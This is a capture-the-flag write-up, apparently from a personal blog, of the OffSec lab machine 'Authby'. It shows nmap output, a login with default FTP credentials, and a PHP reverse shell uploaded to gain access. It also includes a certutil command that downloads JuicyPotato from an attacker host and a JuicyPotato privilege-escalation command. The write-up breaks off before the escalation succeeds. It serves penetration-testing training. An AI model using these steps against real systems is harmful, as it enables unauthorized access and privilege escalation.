---
title: "Authby"
date: 2026-03-28
draft: false
description: "OffSec Authby writeup"
tags: ["windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Authby

## Overview

- **OS:** Windows
- **IP:** 192.168.217.46
- **Difficulty:** Hard
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

RCE via FTP privesc with juicypotato.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
**21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17**
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Mar 28 23:38 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Oct 11 00:16 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2026-03-28T16:39:18+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2026-03-28T16:39:13+00:00
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2025-10-09T17:16:18
|_Not valid after:  2026-04-10T17:16:18
```

## FTP

we couldnt grab anything but we found 2 users admin and offsec and are able to get in w the creds admin admin

{{< figure src="image 903.png" >}}

{{< figure src="image 904.png" >}}

{{< figure src="image 905.png" >}}

we have write perms so lets upload a php rev shell nd browse it

## Dirbusting

```

```

## Port 242

I validated this step using the evidence below before moving forward in the chain.

{{< figure src="image 906.png" >}}

## Exploitation

on visiting the reverseshell after putting it into the ftp serv as admin we have our connection

{{< figure src="image 907.png" >}}

systeminfo tells us our machine is x86 which is 32bit

and because we have the selfimpersonate priv we can go ahead and use juicypotato

```
certutil -urlcache -split -f http://192.168.45.154/Juicy.Potato.x86.exe
```

{{< figure src="image 908.png" >}}

the default CLSID didnt work

```
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
```
